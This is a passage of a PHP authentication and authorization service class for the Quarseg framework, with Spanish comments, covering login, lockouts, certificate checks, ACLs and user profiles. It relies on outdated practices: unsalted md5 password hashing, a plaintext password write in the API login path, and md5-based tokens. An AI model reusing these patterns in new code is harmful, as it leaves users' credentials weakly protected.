<?php

/**
 * Interfaz o Proxy utilizado por Quarseg para brindar los servicios de
 * autenticación, autorización, auditoria y administración de perfiles.
 *
 * @package   Quarseg
 * @copyright XETID.
 * @author    Equipo de desarrollo Zeolides.
 * @version   3.0
 */
class SeguridadProxyService
{
    public function init()
    {

    }

    /**
     * - Brinda el servicio de autenticación por usuario y password.
     * @method authenticateUser($user, $password)
     * @param STRING - Usuario que se esta autenticando
     * @param STRING - Clave de acceso del usuario
     *
     * @return ARRAY - Listado asociativo que contiene código y descripción en
     * caso de ocurrir errores o satistactorio y token de seguridad en caso
     * de autenticarse satisfactoriamente.
     */
    public function authenticateUser($user, $password)
    {
        if ($user != "" && $password != "") {
            $register = Zend_Registry::getInstance();
            $config = new Zend_Config_Ini(
                $register->config->security_config, 'cache'
            );
            $arrayLocks = self::convertArray(                      //Arreglo que almacena los usuarios y los ips bloqueados
                SegBloqueo::getAllLocks(
                    ($config->active)
                        ? $config->minutes * 60
                        : 0
                )
            );

            //Instanciando la clase traza
            $trace = ZendExt_Aspect_Trace::getInstance();
            $arrayRem = array(ZendExt_App::ipRealPcCliente());

            $array = $arrayLocks['IpLocks'];

            if (array_intersect(array($user), $arrayLocks['UserLocks'])
                && array_intersect($arrayRem, $array)
            ) {
                $text = 'Usuario e IP bloqueados. Contacte con el administrador.';
                $arrayLock = array('code' => 'LOCKUSERSANDIP', 'ERROR' => $text);
                $trace->traceBloqueo(3);
                return $arrayLock;
            }
            if (array_intersect(array($user), $arrayLocks['UserLocks'])) {
                $trace->traceBloqueo(2);

                return array(
                    'code' => 'LOCKUSERS',
                    'ERROR' => 'Usuario bloqueado. Contacte con el administrador.'
                );
            }
            if (array_intersect(
                array(ZendExt_App::ipRealPcCliente()),
                $arrayLocks['IpLocks']
            )) {
                $trace->traceBloqueo(1);
                return array(
                    'code' => 'LOCKIPS',
                    'ERROR' => 'Ip bloqueado. Contacte con el administrador.'
                );
            }
            //$session = new Zend_Session_Namespace();
            $verificar = SegUsuario::obtenerUsuario($user);


            if ($verificar[0]->idusuario
                && $verificar[0]->activo
                && self::verificarIP(ZendExt_App::ipRealPcCliente(), $verificar[0]->ip)
                && self::verifyAccess($verificar[0])
            ) {
                $rSA = new ZendExt_RSA_Facade();
                $objUsuario = Doctrine::getTable('SegUsuario')->find(
                    $verificar[0]->idusuario
                );
                if ($verificar[0]->idservidor) {
                    $password = $rSA->decrypt($password);
                    if (self::AD_Autentication($verificar[0], $user, $password)) {
                        $session = new Zend_Session_Namespace();
                        if (isset($session->block)) {
                            $session->block['userAttempts'][$verificar[0]->nombreusuario] = 0;
                            $session->block['ipAttempts'] = 0;
                        }
                        //$password = $rSA->decrypt($password);
                        if ($verificar[0]->contrasenna != md5($password)) {
                            /*$objUsuario = Doctrine::getTable('SegUsuario')->find(
                                $verificar[0]->idusuario
                            );*/
                            $objUsuario->contrasenna = md5($password);
                            /*$objUsuario->save();*/
                        }
                    } else {
                        //AÑADIENDO UNA TRAZA DE TIPO FALLO DE AUTENTICACIÓN
                        $trace->traceFalloAutenticacion();
                        return self::block($verificar[0]);
                    }
                } else {
                    //$objUsuario = new SegUsuario();
                    $password = $rSA->decrypt($password);
                    $resultUsuario = $objUsuario->comprobarusuario(
                        $user, md5($password)
                    );
                    if (!count($resultUsuario)) {
//                    sleep(3);
                        //AÑADIENDO UNA TRAZA DE TIPO FALLO DE AUTENTICACIÓN
                        $trace->traceFalloAutenticacion();
                        return self::block($verificar[0]);
                    } else {
                        $session = new Zend_Session_Namespace();
                        if (isset($session->block)) {
                            $session->block['userAttempts'][$verificar[0]->nombreusuario] = 0;
                            $session->block['ipAttempts'] = 0;
                        }
                    }
                }
                if (!$verificar[0]->idpersona) {
                    return array(
                        'code' => 'LOCKUSERS',
                        'ERROR' => 'El usuario no tiene perfil asignado. Contacte con el administrador.'
                    );
                }
                if (!$verificar[0]->accesoconcurrente) {
                    SegSession::deleteOpenedSessionByUser($user);
                }
                $obj = self::returnCertificate(
                    ZendExt_App::ipRealPcCliente(),
                    $verificar[0]->idusuario,
                    $user
                );
                $objUsuario->ultimoacceso = date('d-m-Y H:i:s');
                $objUsuario->save();
                return array('SUCCESS' => true, 'Token' => $obj, 'Profile' => $this->getProfile($obj));
            } else {
//            sleep(3);
                //AÑADIENDO UNA TRAZA DE TIPO FALLO DE AUTENTICACIÓN
                $trace->traceFalloAutenticacion();
                return self::block($verificar[0]);
            }
        } else {
            $trace = ZendExt_Aspect_Trace::getInstance();
            $trace->traceFalloAutenticacion();
            return array(
                'code' => 'DEFAULT_ERROR',
                'ERROR' => 'Usuario o contraseña incorrectos.'
            );
        }
    }


    /**
     * - Función usada para retornar el estado de el usuario autenticado.
     *
     * @return bool - Si el usuario está activo o no.
     */
    public function getUserState()
    {
        $perfil = ZendExt_GlobalConcept::getInstance()->Perfil;
        $username = $perfil->usuario;
        $user = SegUsuario::obtenerUsuario($username);
        $state = $user[0]->activo;
        return $state;
    }


    /**
     * - Verifica si el usuario tiene restricciones de acceso.
     *
     * @param SegUsuario $userRecord - Datos del usuario.
     *
     * @return bool - Si tiene o no restricción de acceso.
     */
    private static function verifyAccess($userRecord)
    {
        static $_sessionObj = null;
        if ($userRecord->accesoconcurrente) {
            return true;
        }
        if (is_null($_sessionObj)) {
            $_sessionObj = SegSession::getOpenedSessionByUser(
                $userRecord->nombreusuario
            );
        }
        if (count($_sessionObj) == 0) {
            return true;
        }
        if ($userRecord->reescribirsesion) {
            return true;
        }

        return false;
    }

    /**
     * - Función usada para retornar el listado de usuarios y direcciones ip
     * bloqueados por separado.
     *
     * @param array $array
     *
     * @return array Listado de usuario e IP bloqueados.
     */
    private static function convertArray($array)
    {
        $arrayUserLocks = array();
        $arrayIpLocks = array();
        foreach ($array as $value) {
            if (isset($value['usuario'])) {
                array_push($arrayUserLocks, $value['usuario']);
            }
            if (isset($value['ip'])) {
                array_push($arrayIpLocks, $value['ip']);
            }
        }

        return array(
            'UserLocks' => $arrayUserLocks,
            'IpLocks' => $arrayIpLocks
        );
    }

    /**
     * - Función usada para ejecutar el bloque de acuerdo a la configuración de
     * seguridad este puede ser permanente o temporal. Esta función
     * es ejecutada cada ves que el usuario trate de autenticarse y el proceso
     * suceda de forma insatisfactoria.
     *
     * @param SegUsuario $objUsuario Objeto de usuario.
     *
     * @return array Retorna un listado que contiene el código y el error del
     *               bloqueo. Los códigos retornados son: LOCKUSERS, LOCKIPS y
     *               DEFAULT_ERROR. Ej: array('code'=>'DEFAULT_ERROR',
     * 'ERROR'=>'Usuario o contraseña incorrectos.')
     */
    private static function block($objUsuario = null, $cert = null)
    {
        $trace = ZendExt_Aspect_Trace::getInstance();
        $register = Zend_Registry::getInstance();
        $config = new Zend_Config_Ini(
            $register->config->security_config, 'cache'
        );
        $arrayResult = array();
        $session = new Zend_Session_Namespace();
        if (!isset($session->block)) {
            $session->block = array(
                'userAttempts' => array($objUsuario->nombreusuario => 0),
                'ipAttempts' => 0
            );
        }

        $session->block['userAttempts'][$objUsuario->nombreusuario]++;
        $session->block['ipAttempts']++;


        if ((bool)$config->user->active === true
            && $config->user->attempts == $session->block['userAttempts'][$objUsuario->nombreusuario]
            && isset($objUsuario->nombreusuario)
        ) {
            $objUsuarioBloq = new SegBloqueo();
            $objUsuarioBloq->fecha = date(
                ZendExt_GlobalConcept::getInstance()->Formato->fecha
            );
            $objUsuarioBloq->hora = date(
                ZendExt_GlobalConcept::getInstance()->Formato->hora
            );
            $objUsuarioBloq->intento =
                $session->block['userAttempts'][$objUsuario->nombreusuario];
            $objUsuarioBloq->SegBloqueousuario->iddominio =
                $objUsuario->iddominio;
            $objUsuarioBloq->SegBloqueousuario->usuario =
                $objUsuario->nombreusuario;
            $objUsuarioBloq->SegBloqueousuario->ip = ZendExt_App::ipRealPcCliente();
            $objUsuarioBloq->save();
            $conn = Doctrine_Manager::getInstance()->getCurrentConnection();
            $conn->commit();
            $conn->beginTransaction();
            unset($session->block['userAttempts'][$objUsuario->nombreusuario]);
            $arrayResult[] = 'LOCKUSERS';
            // AÑADIENDO UNA TRAZA DE BLOQUEO DE USUARIO
            $trace->traceBloqueo(2);
        }
        /*if ((bool)$config->ip->active === true
            && $config->ip->attempts == $session->block['ipAttempts']
        ) {
            $objIpBloq = new SegBloqueo();
            $objIpBloq->fecha = date(
                ZendExt_GlobalConcept::getInstance()->Formato->fecha
            );
            $objIpBloq->hora = date(
                ZendExt_GlobalConcept::getInstance()->Formato->hora
            );
            $objIpBloq->intento = $session->block['ipAttempts'];
            $objIpBloq->SegBloqueoip->ip = ZendExt_App::ipRealPcCliente();
            $objIpBloq->save();
            Doctrine_Manager::getInstance()->getCurrentConnection()->commit();
            unset($session->block['ipAttempts']);
            $arrayResult[] = 'LOCKIPS';
            // AÑADIENDO UNA TRAZA DE BLOQUEO DE IP
            $trace->traceBloqueo(1);
        }*/
        if (count($arrayResult) > 1) {
            $text = 'Usuario e IP bloqueados. Contacte con el administrador.';
            $arrayId = array('code' => 'LOCKUSERSANDIP', 'ERROR' => $text);

            return $arrayId;
        } else {
            if ($arrayResult[0] == 'LOCKUSERS') {
                return array(
                    'code' => 'LOCKUSERS',
                    'ERROR' => 'Usuario bloqueado. '
                        . 'Contacte con el administrador.'
                );
            } else {
                if ($arrayResult[0] == 'LOCKIPS') {
                    return array(
                        'code' => 'LOCKIPS',
                        'ERROR' => 'Ip bloqueado. '
                            . 'Contacte con el administrador.'
                    );
                } else {
                    if ($objUsuario->idusuario && $objUsuario->activo) {
                        if (!self::verificarIP(
                            ZendExt_App::ipRealPcCliente(), $objUsuario->ip
                        )
                        ) {
                            $text = 'Su usuario no tiene acceso desde esa '
                                . 'dirección IP. '
                                . 'Contacte con el administrador.';
                            $arrayRest = array(
                                'code' => 'RESTRICTIP', 'ERROR' => $text
                            );

                            return $arrayRest;
                        }
                        if (!self::verifyAccess($objUsuario)) {
                            $text = 'Su usuario tiene una sesión activa en '
                                . 'otra ubicación. Contacte con '
                                . 'el administrador.';
                            $arrayUbi = array(
                                'code' => 'RESTRICTACCES', 'ERROR' => $text
                            );

                            return $arrayUbi;
                        }
                    }
                }
            }
        }
        if ($cert) {
            return array(
                'code' => 'DEFAULT_ERROR',
                'ERROR' => 'Certificado de usuario incorrecto.'
            );
        } else {
            return array(
                'code' => 'DEFAULT_ERROR',
                'ERROR' => 'Usuario o contraseña incorrectos.'
            );
        }
    }

    /**
     * - Brinda el servicio de autenticación por usuario y contraseña.
     * @method authenticateUserApi($user, $password)
     * @param STRING - Usuario que se esta autenticando
     * @param STRING - Clave de acceso del usuario
     *
     * @return STRING - Certificado o token de seguridad asignado al usuario.
     */
    public function authenticateUserApi($user, $password)
    {
        $mac = ZendExt_App::ipRealPcCliente();
        $verificar = SegUsuario::obtenerUsuario($user);
        if (!$verificar[0]->activo) {
            return 0;
        }
        if ($verificar[0]->ip) {
            $ip = ZendExt_App::ipRealPcCliente();
            $acceso = self::verificarIP($ip, $verificar[0]->ip);
        } elseif ($verificar[0]->idusuario) {
            $acceso = true;
        } else {
            $acceso = false;
        }
        if ($acceso) {
            $observ = SegUsuarioDatSerautenticacion::cantservidoraut(
                $verificar[0]->idusuario
            );
            if (count($observ)) {
                $sA = DatServidor::usuarioservidoraut($observ[0]->idservidor);
                $result = self::AD_Autentication($sA, $user, $password);
                if ($result) {
                    if ($verificar[0]->contrasenna != $password) {
                        $objusurio = Doctrine::getTable('SegUsuario')
                            ->find($verificar[0]->idusuario);
                        $objusurio->contrasenna = $password;
                        $objusurio->save();
                        $result = self::returnCertificate(
                            $mac, $verificar[0]->idusuario, $user
                        );

                        return $result;
                    } else {
                        $result = self::returnCertificate(
                            $mac, $verificar[0]->idusuario, $user
                        );

                        return $result;
                    }
                } else {
                    return 0;
                }
            } else {
                $objUsuario = new SegUsuario();
                $resultUsuario = $objUsuario->comprobarusuario(
                    $user, md5($password)
                );
                if (count($resultUsuario)) {
                    $result = self::returnCertificate(
                        $mac, $resultUsuario[0]['idusuario'], $user
                    );

                    return $result;
                } else {
                    return 0;
                }
            }
        }

        return 0;
    }

    /**
     * - Verifica la valid&eacute;s del certificado.
     * @method verifyCertificate($certificado, $usuario)
     * @param STRING - Certificado del usuario.
     * @param STRING - Usuario.
     *
     * @return INTEGER - Retorna 1 si el Certificado es
     * valido 0 de lo contrario.
     */
    public function verifyCertificate($certificado, $usuario)
    {
        $rSA = new ZendExt_RSA_Facade();
        $stringCertificate = $rSA->decrypt($certificado);
        $xML = new SimpleXMLElement($stringCertificate);
        $fecha = (string)$xML->attributes()->fecha;
        $remote = ZendExt_App::ipRealPcCliente();
        $user = $_SERVER['HTTP_USER_AGENT'];
        $tOKEN = 'TOKEN:<' . $remote . ' ' . $user . ' ' . $usuario
            . ' ' . $fecha . ' Quarseg >';
        $tOKEN = md5($tOKEN);
        if ((string)$xML->attributes()->token != $tOKEN) {
            return 0;
        }

        return 1;
    }

    /**
     * - Retorna el listado de usuarios paginados.
     * @method getUserList($limit, $start, $nombreusuario = null)
     * @param INTEGER - L&iacute;mite superior
     * @param INTEGER - L&iacute;mite inferior
     * @param STRING - Nombre de usuario o porcion del nombre para
     * filtrar.
     * @return ARRAY - Arreglo asociativo que contiene la cantidad total
     * de elementos a mostrar y los metadatos de cada uno de ellos.
     */
    public function getUserList($limit, $start, $nombreusuario = null)
    {
        $perfil = ZendExt_GlobalConcept::getInstance()->Perfil;
        $idusuario = $perfil->idusuario;
        $iddominio = $perfil->iddominio;
        if ($nombreusuario) {
            $datosusuario = SegUsuario::cargarGridUsuarioBuscados(
                $nombreusuario,
                $idusuario,
                $iddominio,
                null,
                null,
                $limit,
                $start
            );
            $cantf = SegUsuario::cantidadFilasUsuariosBuscados(
                $nombreusuario, $idusuario, $iddominio, null, null
            );
        } else {
            $datosusuario = SegUsuario::cargarGridUsuario(
                $idusuario, $iddominio, $limit, $start
            );
            $cantidadUsuarios = SegUsuario::cantidadFilas($idusuario, $iddominio);
        }
        return array(
            'cantidad_filas' => $cantidadUsuarios, 'datos' => $datosusuario
        );
    }

    /**
     * - Retorna el id de todos los ususarios contenidos en los l&iacute;mites.
     * @method allUser()
     * @param INTEGER - L&iacute;mite superior
     * @param INTEGER - L&iacute;mite inferior
     * @return ARRAY - Arreglo asociativo que contiene los id de
     * todos los usuarios contenidos en los l&iacute;mites.
     */
    public function allUser($limit, $start)
    {
        $total = SegUsuario::obtenerCantidadUsuarios();
        $usuarios = SegUsuario::obtenerTodosLosUsuarios($limit, $start);
        return array('cantidad_filas' => $total, 'datos' => $usuarios);
    }

    /**
     * - Retorna la cantidad de usuarios registrados en el sistema.
     * @method cantidadUsuarios()
     * @param - Ninguno
     * @return INTEGER - Cantidad de ususarios del sistema.
     */
    public function cantidadUsuarios()
    {
        return SegUsuario::obtenerCantidadUsuarios();
    }

    /**
     * - Retorna el listado de roles paginados.
     * @param INTEGER - L&iacute;mite superior
     * @param INTEGER - L&iacute;mite inferior
     * @param STRING - Nombre del rol o porci&oacute;n del nombre para
     * filtrar.
     * @return ARRAY - Listado asociativo que contiene la cantidad
     * total de elementos a mostrar y los metadatos de cada uno de ellos.
     */
    public function getRoleList($limit, $start, $nombreRol = null)
    {
        return SegRolModel::loadGrid($start, $limit, $nombreRol, 0);
    }

    /**
     * - Retorna la ACL del usuario autenticado.
     * @method getUserAcl($certificado, $identidad)
     * @param STRING - Certificado del usuario Autenticado.
     * @param NUMERIC - Identificador de la estructura accedida.
     *
     * @return ARRAY - ACL del usuario autenticado.
     */
    public function getUserAcl($certificado, $identidad)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificado);
        $datos = $objcertificado->verificarcertificado($certificate);
        if (count($datos)) {
            $idusuario = $datos[0]->idusuario;
            $acceso = self::getRol($idusuario, $identidad);
            $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
            $roles = SegRol::obtenerRolesGrupo(($rol[0]->idrol));
            /*$obj = SegUtil::convertToUnidimensional(
                SegRolGrupo::obtenerGruposRol(array($rol[0]->idrol)), 'idgrupo'
            );*/
            $obj = SegUtil::convertToUnidimensional(
                $roles, 'idrol'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $obj);

            $arrayResources = DatFuncionalidadDatAccion::getAllRoleResourse(
                $arrayIds
            );

            return self::getArrayReferencias($arrayResources);
        }
        return array();
    }

    /**
     * - Retorna la ACL del usuario autenticado.
     * @method getUserAclByRol($certificado, $idrol)
     * @param NUMERIC - Identificador del rol.
     *
     * @return ARRAY - ACL del usuario.
     */
    public function getUserAclByRol($idrol)
    {
        /*$obj = SegUtil::convertToUnidimensional(
            SegRolGrupo::obtenerGruposRol($idrol), 'idgrupo'
        );
        $arrayIds = array_merge($idrol, $obj);
        */
        $roles = SegRol::obtenerRolesGrupo(($idrol));
        $obj = SegUtil::convertToUnidimensional(
            $roles, 'idrol'
        );
        $arrayIds = array_merge($idrol, $obj);

        $arrayResources = DatFuncionalidadDatAccion::getAllRoleResourse(
            $arrayIds
        );
        return self::getArrayReferencias($arrayResources);
    }

    /**
     * - Verifica que un usuario tenga acceso al recurso solicitado.
     * @method verifyAccessToResourse($certificate, $resourse)
     * @param STRING - Certificado del usuario Autenticado.
     * @param STRING - Recurso.
     *
     * @return INTEGER         - Retorna 1 si tiene acceso 0 de lo contrario.
     */
    public function verifyAccessToResourse($certificate, $resourse)
    {
        $resourse = explode('/', $resourse);
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        if (count($datos)) {
            $idusuario = $datos[0]->idusuario;
            $arrayRoles = DatEntidadSegUsuarioSegRol::getAllRolesByUserId(
                $idusuario
            );
            $arrayRoles = SegUtil::convertToUnidimensional(
                $arrayRoles, 'idrol'
            );
            $access = DatRecurso::verifyAccessToResourse(
                $idusuario, $resourse, $arrayRoles
            );
            if (count($access) > 0) {
                return 1;
            } else {
                return 0;
            }
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Retorna el perfil del usuario autenticado.
     * @method getProfile($_certificate)
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     *
     * @return ARRAY - Datos del perfil del usuario autenticado.
     */
    public function getProfile($_certificate)
    {
        $integrator = ZendExt_IoC::getInstance();
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($_certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        if (count($datos)) {

            $idusuario = $datos[0]->idusuario;
            $perfil = SegUsuario::cargarperfilusuario($idusuario);
            $perfilusuario = array();
            if (count($perfil)) {
                $perfilusuario['tema'] = $perfil[0]['NomTema']['tema'];
                $perfilusuario['dentema'] = $perfil[0]['NomTema']['dentema'];
                $caduca = SegUsuario::obtenerUsuario(
                    $perfil[0]['nombreusuario']
                );

                if (count($perfil[0]['SegUsuarioDatSerautenticacion']) > 0) {
                    $perfilusuario['caduca'] = 20;
                } else {
                    $perfilusuario['caduca'] = self::fecha($caduca[0]->caduca);
                }
                $perfilusuario['idioma'] = $perfil[0]['NomIdioma']['idioma'];
                $perfilusuario['portal'] = $perfil[0]['NomDesktop']['desktop'];
                $perfilusuario['idusuario'] = $perfil[0]['idusuario'];
                $perfilusuario['usuario'] = $perfil[0]['nombreusuario'];
                $perfilusuario['iddominio'] = $perfil[0]['iddominio'];
                $perfilusuario['idpersona'] = $perfil[0]['idpersona'];

                $perfilusuario['mostrarentidad'] = SegUsuarioModel::getEntidad($perfilusuario['idusuario'])[0]['mostrarentidad'];

                if ($perfil[0]['idpersona']) {
                    try {
                        $persona = $integrator->pvd
                            ->obtenerDatosdePersonaparaJabber(
                                $perfil[0]['idpersona']
                            );

                        if (count($persona) == 1) {//es porque es la version nueva persona
                            $perfilusuario['nombre'] = (isset($persona[0]['nombre']))
                                ? $persona['nombre']
                                : " ";
                            $perfilusuario['apellidos'] = (isset($persona[0]['apellidos']))
                                ? $persona['apellidos']
                                : " ";
                            $perfilusuario['sexo'] = (isset($persona[0]['sexo']))
                                ? $persona['sexo']
                                : " ";
                            $img = "/seguridad/views/imgs/persona.jpg";
                            $perfilusuario['foto'] = (isset($persona[0]['foto']))
                                ? $persona[0]['foto']
                                : $img;
                        } else {// es la version vieja de persona
                            $perfilusuario['nombre'] = (isset($persona['nombre']))
                                ? $persona['nombre']
                                : " ";
                            $perfilusuario['apellidos'] = (isset($persona['apellidos']))
                                ? $persona['apellidos']
                                : " ";
                            $perfilusuario['sexo'] = (isset($persona['sexo']))
                                ? $persona['sexo']
                                : " ";
                            $img = "/seguridad/views/imgs/persona.jpg";
                            $perfilusuario['foto'] = (isset($persona['foto']))
                                ? $persona['foto']
                                : $img;
                        }

                    } catch (ZendExt_FastResponse_Exception $e) {//
                        $perfilusuario['nombre'] = " ";
                        $perfilusuario['apellidos'] = " ";
                        $perfilusuario['sexo'] = " ";
                        $perfilusuario['foto'] = "/seguridad/views/imgs/persona.jpg";
                    }
                } else {
                    $perfilusuario['nombre'] = " ";
                    $perfilusuario['apellidos'] = " ";
                    $perfilusuario['sexo'] = " ";
                    $perfilusuario['foto'] = "/seguridad/views/imgs/persona.jpg";
                }

                $arrayAcessos = DatEntidadSegUsuarioSegRol::getAccess($perfil[0]['idusuario']);
                $arrayAcessosUni = SegUtil::convertToUnidimensional(
                    $arrayAcessos, "identidad"
                );
                $entidadeS = SeguridadECProxy::getInstance()->getIdsEntityByRoleIndex($perfil[0]['iddominio'], $arrayAcessosUni);
                if (count($entidadeS) == 1) {
                    $perfilusuario['cantidad'] = $entidadeS[0];

                } else {
                    $perfilusuario['cantidad'] = 0;
                    $perfilusuario['idrol'] = 0;
                }
                if (isset($perfil[0]['NomFila'])
                    && is_array($perfil[0]['NomFila']['NomValor'])
                ) {
                    $perfilusuario['dinamico'] = array();
                    foreach ($perfil[0]['NomFila']['NomValor'] as $valor) {
                        $perfilusuario[$valor['NomCampo']['nombre']] =
                            $valor['valor'];
                        $perfilusuario['dinamico'][] =
                            $valor['NomCampo']['nombre'];
                    }
                }
            }

            return $perfilusuario;
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Obtener el dominio de entidades a la que el usuario tiene acceso.
     * @method loadDomain($certificate, $idEstructura)
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador de la estructura.
     *
     * @return ARRAY - Entidades a las que el usuario tiene acceso.
     */
    public function loadDomain($certificate, $idEstructura)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        if (count($datos)) {
            $cargUs = DatEntidadSegUsuarioSegRol::cargarentidadesusuario(
                $idusuario
            );
            $arrayAccess = SegUtil::convertToUnidimensional(
                $cargUs, "identidad"
            );

            return SeguridadECProxy::getInstance()->loadAccessDomain(
                $idEstructura, $arrayAccess
            );

        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Obtener las estructuras a las que tiene acceso un usuario.
     * @method ObtenerEstructurasNoFormales($certificate, $idnomeav)
     *
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador de la estructura.
     *
     * @return ARRAY - Estructuras a las que tiene acceso
     */
    public function ObtenerEstructurasNoFormales($certificate, $idnomeav)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        if ($idusuario) {
            $entidades = DatEntidadSegUsuarioSegRol::cargarentidadesusuario(
                $idusuario
            );
            if (!count($entidades))
                return array();
            $entidades = SegUtil::convertToUnidimensional(
                $entidades, 'idestructura'
            );
            $global = ZendExt_GlobalConcept::getInstance();
            $iddominio = $global->Perfil->iddominio;
            $arrayultimas = SeguridadECProxy::getInstance()
                ->buscarIdEstructurasDominio(
                    $iddominio, $entidades, 2, $idnomeav
                );
            $arrayultimas = SegUtil::convertToUnidimensional(
                $arrayultimas, 'idestructura'
            );

            return $arrayultimas;
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Obtener las estructuras a las que tiene acceso un usuario.
     * @method ObtenerEstructurasFormales($certificate)
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     *
     * @return ARRAY - Estructuras a las que tiene acceso
     */
    public function ObtenerEstructurasFormales($certificate)
    {
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        if ($idusuario) {
            $entidades = DatEntidadSegUsuarioSegRol::cargarentidadesusuario(
                $idusuario
            );
            if (!count($entidades))
                return array();
            $entidades = SegUtil::convertToUnidimensional(
                $entidades, 'idestructura'
            );
            $global = ZendExt_GlobalConcept::getInstance();
            $iddominio = $global->Perfil->iddominio;
            $arrayultimas = SeguridadECProxy::getInstance()
                ->buscarIdEstructurasDominio($iddominio, $entidades, 1);
            $arrayultimas = SegUtil::convertToUnidimensional(
                $arrayultimas, 'idestructura'
            );

            return $arrayultimas;
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Función para saber si existe algún usuario, puede causar confusión el nombre del método con lo que en realidad hace.
     * @method existUserRol()
     * @return BOOLEAN - Si existe o no el usuario.
     */
    public function existUserRol()
    {
        if (SegUsuario::existealgunusuario() > '0') {
            return 1;
        } else {
            return 0;
        }
    }

    /**
     * - Brinda el servicio de listar todos los sistemas a los que tiene acceso un usuario en una entidad.
     * @method getSystems($certificate, $identidad)
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador de la entidad.
     *
     * @return ARRAY - Sistemas a los que tiene acceso un usuario en una entidad.
     */
    public function getSystems($certificate, $identidad)
    {
        $sistemaArr = array();
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        if (count($datos)) {
            $idusuario = $datos[0]->idusuario;
            $acceso = self::getRol($idusuario, $identidad);
            $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
            /*$group = SegUtil::convertToUnidimensional(
                SegRolGrupo::obtenerGruposRol(array($rol[0]->idrol)), 'idgrupo'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $group);*/
            $roles = SegRol::obtenerRolesGrupo(($rol[0]->idrol));
            $obj = SegUtil::convertToUnidimensional(
                $roles, 'idrol'
            );
            $arrayIds = array_merge(array($rol[0]->idrol), $obj);

            $sistemaObj = DatSistema::obtenersistemas($arrayIds);
            foreach ($sistemaObj as $key => $sistema) {
                $sistemaArr[$key]['id'] = $sistema['idsistema'];
                $sistemaArr[$key]['icono'] = ($sistema['icono'])
                    ? $sistema['icono']
                    : 'falta';
                $sistemaArr[$key]['titulo'] = $sistema['denominacion'];
                $sistemaArr[$key]['externa'] = $sistema['externa'];
            }

            return $sistemaArr;
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Servicio que le permite obtener las acciones de un usuario.
     * @method loadActions($identidad, $idsistema, $idfuncionalidad);
     * $certificado)
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador de la entidad.
     * @param NUMERIC - Identificador del sistema.
     * @param NUMERIC -  Identificador de la funcionalidad.
     *
     * @return JSON - Acciones del usuario autenticado.
     */
    public function loadActions(
        $identidad, $idsistema, $idfuncionalidad, $certificado
    )
    {
        $arracciones = array();
        $objcertificado = new SegCertificado();
        $certificado = self::extractSecurityToken($certificado);
        $datos = $objcertificado->verificarcertificado($certificado);
        if ($datos) {
            $idusuario = $datos[0]->idusuario;
            $acceso = self::getRol($idusuario, $identidad);
            $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
            $accionesquetiene = DatAccion::cargaracciones(
                $idsistema, $idfuncionalidad, $rol[0]->idrol
            );
            foreach ($accionesquetiene as $valores => $valor) {
                $arracciones[$valores]['idaccion'] = $valor->idaccion;
                $arracciones[$valores]['denominacion'] = $valor->denominacion;
            }

            return json_encode($arracciones);
        } else {
            throw new ZendExt_Exception('SGIS003');
        }
    }

    /**
     * - Carga sistemas, subsistemas y funcionalidades.
     * @method getSystemsFunctions($certificate, $idsistema, $identidad)
     *
     * @param STRING - Certificado o token de seguridad
     * asignado al usuario.
     * @param NUMERIC - Identificador del sistema.
     * @param NUMERIC - Identificador de la estructura.
     *
     * @return JSON - Los subsistemas de un sistema o las funcionalidades
     * de un subsistema.
     */
    public function getSystemsFunctions($certificate, $idsistema, $identidad)
    {
        $tmpidsistema = explode('_', $idsistema);
        if (count($tmpidsistema) >= 1) {
            $idsistema = $tmpidsistema[0];
        }
        $objcertificado = new SegCertificado();
        $certificate = self::extractSecurityToken($certificate);
        $datos = $objcertificado->verificarcertificado($certificate);
        $idusuario = $datos[0]->idusuario;
        $acceso = self::getRol($idusuario, $identidad);
        $rol = DatEntidadSegUsuarioSegRol::obtenerrol($idusuario, $acceso);
        $idrol = $rol[0]->idrol;
        $acceso = DatSistema::verificarrolsistema($idrol, $idsistema);
        if (count($acceso)) {
            $sistemas = DatSistema::cargarsistema($idsistema);
            $externa = DatSistema::buscarservidorweb($idsistema);
            $contador = 0;
            $sistemafunArr = array();
            if ($sistemas->count()) {
                foreach ($sistemas as $valor) {
                    $sistemafunArr[$contador]['id'] = $valor->id . '_'
                        . $idsistema;
                    $sistemafunArr[$contador]['idsistema'] = $valor->id;
                    $sistemafunArr[$contador]['externa'] = $valor->externa;
                    $sistemafunArr[$contador]['icono'] = $valor->icono;
                    $sistemafunArr[$contador]['text'] = $valor->text;
                    $sistemafunArr[$contador]['leaf'] = false;
